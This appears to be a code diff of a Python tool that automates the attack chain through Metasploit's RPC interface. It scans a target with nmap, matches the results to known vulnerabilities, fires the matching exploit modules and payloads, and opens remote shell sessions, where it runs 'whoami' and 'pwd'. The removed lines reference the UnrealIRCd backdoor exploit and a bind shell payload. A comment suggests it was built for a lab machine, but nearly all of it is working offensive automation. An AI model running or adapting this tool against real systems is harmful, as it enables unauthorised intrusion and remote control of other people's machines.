@@ -14,61 +14,84 @@ import utils
 import subprocess
 from knownVulnerabilities import vulnerabilities
 
-CHECKMODE = False # will check for exploits rather than running them when can
-EXPLOITNUM = 3 # for testing
-RHOSTS = ["192.168.130.128"] # PUT YOUR HOST HERE or feed it in through console
+CHECK_MODE = False # will check for exploits rather than running them when can
+RUN_NMAP = False # set this to false when you want to test on metasploit machine and assume all exploits will run
+NMAP_AGGRESSIVENESS = 2
+# in order of increasing levels of fucking around (and also in increasing levels of finding out)
+NMAP_POSSIBLE_ARGS = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
+EXPLOIT_NUM = 3 # for testing
+EXPLOIT_NUM = min(EXPLOIT_NUM, len(vulnerabilities) - 1)
+RHOSTS = ["192.168.130.128"] # PUT YOUR HOST HERE or feed it in through command line argument
 if len(sys.argv) > 1:
-    RHOSTS = sys.argv[1]
+    RHOSTS = list(sys.argv[1])
 startTime = time.time()
 
 # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
-def runExploits(vulnerabilitiesToUse = set([vulnerabilities[EXPLOITNUM]])):
-    strRHOSTS = ", ".join(RHOSTS)
-    print("Exploiting vulnerabilities on " + strRHOSTS) 
-    console = client.consoles.console()
-    for vulnerability in vulnerabilitiesToUse:
+def runExploits(vulnerabilitiesToUse = set([vulnerabilities[EXPLOIT_NUM]])):
+    consoles = []
+    savedOutputInfo = dict()
+    for (i, vulnerability) in enumerate(vulnerabilitiesToUse):
+        # once one session is created, don't perform any of the other exploits
+        if vulnerability.exploitType == "exploit" and len(client.sessions.list) > 0:
+            print("Skipping vulnerability as RCE session has already been created")
+            continue
         module = vulnerability.module
-        print("VULNERABILITY DESCRIPTION:", vulnerability.description)
-        print("VULNERABILITY MODULE:", vulnerability.module)
-        print("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n")
-        module = vulnerability.module
-        print("YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n")
         exploit = client.modules.use(vulnerability.exploitType, module)
-        print("ZZZZZZZZZZZZZZZZZZZZZZZZZZZZz\n")
         # options = exploit.options
         exploit.missing_required
         if 'RHOSTS' in exploit.missing_required:
             exploit['RHOSTS'] = RHOSTS[0] # TODO: change this to loop through
         if exploit.missing_required:
             print("missing options:", exploit.missing_required)
-        if False: #TODO: delete this if the below works
-            print("payload:", vulnerability.payload)
-            if CHECKMODE & vulnerability.canCheck:
-                exploit.check_redo(payload=vulnerability.payload)
+        
+        if CHECK_MODE & vulnerability.canCheck: # CHECK THE EXPLOIT's FEASIBILITY
+            print("#" * 34, "ONLY CHECKING EXPLOITABILITY", "#" * 34)
+            print("VULNERABILITY MODULE:", vulnerability.module)
+            if vulnerability.payload:
+                print("PAYLOAD:", vulnerability.payload)
+                payload_ = client.modules.use('payload', vulnerability.payload)
+                print("!!  CHECK STATUS  !!:", exploit.check_redo(payload=payload_))
+                print("!! CHECK STATUS 2 !!:", exploit.check_redo(payload=vulnerability.payload))
             else:
-                exploit.execute(payload=vulnerability.payload)
-        else:
-            if CHECKMODE & vulnerability.canCheck:
-                print("ONLY CHECKING EXPLOITABILITY")
-                exploit.check_redo()
+                print("!! CHECK STATUS !!:", exploit.check_redo())
+            exploit.check_redo()
+        else: ### EXPLOIT THE MODULE
+            print("#" * 34, "RUNNING", vulnerability.exploitType + ":", vulnerability.description, "#" * 34)
+            # print("EXPLOIT INFO:\n" + exploit._info) # uncomment this for A LOT of info
+            print("VULNERABILITY MODULE:", vulnerability.module)
+            console = client.consoles.console()
+            consoles.append((console, vulnerability.description))
+            if vulnerability.payload:
+                print("PAYLOAD:", vulnerability.payload)
+                print("PAYLOAD IS VALID:", vulnerability.payload in exploit.targetpayloads())
+                payload_ = client.modules.use('payload', vulnerability.payload)
+                if payload_.missing_required:
+                    print("PAYLOAD MISSING OPTIONS:", payload_.missing_required)
+                output = console.run_module_with_output(exploit, payload=payload_)
+                # exploit.execute(payload=vulnerability.payload)
+                # exploit.execute(payload=payload_)
+                # output = ""
             else:
-                print("################# RUNNING EXPLOIT,", vulnerability.description, "#################")
-                # while console.is  _busy:
-                #     time.sleep(1)
-                #     print("BUSY CONSOLE", rd.randint(0,1))
-                output = console.run_module_with_output(exploit, payload=vulnerability.payload)
-                print("OUTPUT:\n", output)
-                print("\n")
-                result = utils.extractResult(output)
-                print("OUTPUT extracted:\n", result)
-                print("\n")
-            # else:
-            #     exploit.execute()
-        print("ALL EXPLOITS SETUP AND RUNNING")
-        while(client.jobs.list):
-            print("JOB LIST @", round(time.time() - startTime, 2), "seconds:", client.jobs.list)
-            time.sleep(10)
-        print(client.sessions.list)
+                output = console.run_module_with_output(exploit)
+            # print("\nOUTPUT:\n" + output) # uncomment this for debugging output
+            resultExtracted = utils.getSuccessMessage(output)
+            print("OUTPUT extracted:")
+            print(resultExtracted)
+            if vulnerability.outputPatternMatch:
+                savedOutputInfo[i] = []
+                for line in resultExtracted.splitlines():
+                    matchedText = re.search(vulnerability.outputPatternMatch, line)
+                    if matchedText:
+                        savedOutputInfo[i].append(matchedText[0])
+            print("#" * 34, "FINISHED", vulnerability.exploitType + ":", vulnerability.description, "#" * 34)
+
+    print("ALL EXPLOITS SETUP AND RUNNING")
+    while(client.jobs.list):
+        print("SESSION LIST [" + str(len(client.sessions.list)) + "]:", client.sessions.list)
+        print("JOB LIST [" + str(len(client.jobs.list)) + "]:", round(time.time() - startTime, 2), "seconds:", client.jobs.list)
+        time.sleep(10)
+    print("SESSION LIST:", client.sessions.list)
+    return savedOutputInfo
 
 if __name__ == "__main__":
     #############################################################################
@@ -97,67 +120,76 @@ if __name__ == "__main__":
     # resultModules.append(dict_module)
 
     ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
-    runExploits()
-    exit()
+    # savedOutputInfo = runExploits()
+    # exit()
     ##############################################################################################
 
-    ######## RECONAISSANCE PHASE ########
-    nmapAggressiveness = 2
-    # in order of increasing levels of fucking around (and also in increasing levels of finding out)
-    nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
-    nmapArgs = nmapPossibleArgs[nmapAggressiveness]
-    output = nmap_dest.nmap_xml_output(RHOSTS, nmapArgs)
-    print(output)
-    if (output[1][0:22] == "Note: Host seems down."):
-        print("Host seems down. Exiting.")
-        exit()
+    nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
+    for RHOST in RHOSTS:
+        print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
+        # Decides if we want to run nmap or just assumes all outputs work
+        if RUN_NMAP: # TODO: make option so instead of not running nmap, take file input as hypothetical output of NMAP
+            ######## RECONAISSANCE PHASE ########
+            nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
+            print(nmapOutput)
+            if (nmapOutput[1][0:22] == "Note: Host seems down."):
+                print("Host seems down. Exiting.")
+                exit()
 
-    ######## WEAPONIZATION PHASE ########
-    vulnerabilitiesToUse = set()
-    for line in output:
-        # Detect what keywords each line of the nmap output contains and compare those to the descriptions
-        # for each known vulnerability and if all key words of a vulnerability are found, add it to the exploit list
-        for vulnerability in vulnerabilities:
-            keyWordsFoundCount = 0
-            flag = None
-            if vulnerability.caseSensitiveKeyTermMatch:
-                flag = 0
-            else:
-                flag = re.IGNORECASE
-            # TODO: make it so there is a list of optional or guaranteed key terms
-            for keyword in vulnerability.keywords:
-                if re.search(keyword, line, flag):
-                    keyWordsFoundCount += 1
-            if keyWordsFoundCount < vulnerability.minKeyTermsThatMustMatch:
-                continue
-            if not vulnerability in vulnerabilitiesToUse:
-                vulnerabilitiesToUse.add(vulnerability)
-                print("*********", vulnerability.description, "EXPLOIT FOUND *********")
+            ######## WEAPONIZATION PHASE ########
+            vulnerabilitiesToUse = set()
+            vulnInfos = []
+            for i in range(len(vulnerabilities)):
+                vulnInfos.append(dict())
+                vulnInfos[i]["keywords"] = set()
+                vulnInfos[i]["optionalKeywords"] = set()
+            # Scan nmap output for key terms
+            for line in nmapOutput:
+                # Detect what keywords each line of the nmap output contains and compare those to the descriptions
+                # for each known vulnerability and add matched key terms to vulnInfosDict
+                for (i, vulnerability) in enumerate(vulnerabilities):
+                    flag = re.IGNORECASE
+                    if vulnerability.caseSensitiveKeyTermMatch:
+                        flag = 0
+                    for keyword in vulnerability.keywords:
+                        if re.search(keyword, line, flag):
+                            vulnInfos[i]["keywords"].add(keyword)
+                    for optionalKeyword in vulnerability.optionalKeywords:
+                        if re.search(optionalKeyword, line, flag):
+                            vulnInfos[i]["optionalKeywords"].add(optionalKeyword)
+            
+            # Determine which vulns to use based off NMAP scan
+            # If we match a keyterm or find minOptionalKeyTermsThatMustMatch optional key terms
+            for (i, vulnInfo) in enumerate(vulnInfos):
+                if len(vulnInfo["keywords"]) > 0 or len(vulnInfo["optionalKeywords"]) > vulnerabilities[i].minOptionalKeyTermsThatMustMatch:
+                    print("X" * 34, vulnerabilities[i].description, "EXPLOIT FOUND", "*" * 34)
+                    vulnerabilitiesToUse.add(vulnerabilities[i])
+        else:
+            # here we don't run nmap and just assume that all vulnerabilities work
+            print("SKIPPING NMAP PHASE, RUNNING ALL EXPLOITS WORK")
+            vulnerabilitiesToUse = vulnerabilities
+        
+        ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
+        savedOutputInfo = runExploits(vulnerabilitiesToUse)
 
-    ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
-    # exploit = client.modules.use(vulnerability.exploitType, 'unix/irc/unreal_ircd_3281_backdoor')
-    # exploit['RHOSTS'] = RHOSTS
-    # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')
-    # exploit.execute(payload='cmd/unix/bind_ruby')
-    runExploits(vulnerabilitiesToUse)
-    
-    while(client.jobs.list):
-        print("JOB LIST @", round(time.time() - startTime, 2), "seconds:", client.jobs.list)
-        time.sleep(10)
+        ####### Print some info on the sessions created
+        print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
+        sessions = client.sessions.list
+        numSessions = 0
+        for k in client.sessions.list.keys():
+            numSessions += 1
+        print("Number of sessions created:", numSessions)
 
-    ####### Print some info on the sessions created
-    print("@@@@@@@@ ALL EXPLOITS FINISHED @@@@@@@@")
-    sessions = client.sessions.list
-    numSessions = 0
-    for k in client.sessions.list.keys():
-        numSessions += 1
-    print("Number of sessions created:", numSessions)
+        print("Testing sessions (two lines should appear below, the result of the 'whoami' and 'pwd' commands):")
+        for k in client.sessions.list.keys():
+            shell = client.sessions.session(str(k))
+            shell.write('whoami')
+            shell.write('pwd')
+            print(shell.read())
 
-    for k in client.sessions.list.keys():
-        shell = client.sessions.session(str(k))
-        shell.write('whoami')
-        shell.write('pwd')
-        print(shell.read())
-
-    print()
-    
+        # print out saved info from running exploits
+        print("$" * 34, "SAVED OUTPUT INFO", "$" * 34)
+        for v in savedOutputInfo.keys():
+            print("SAVED OUTPUT FOR EXPLOIT", v, "(" + vulnerabilities[v].description + "):")
+            for line in savedOutputInfo[v]:
+                print(line)
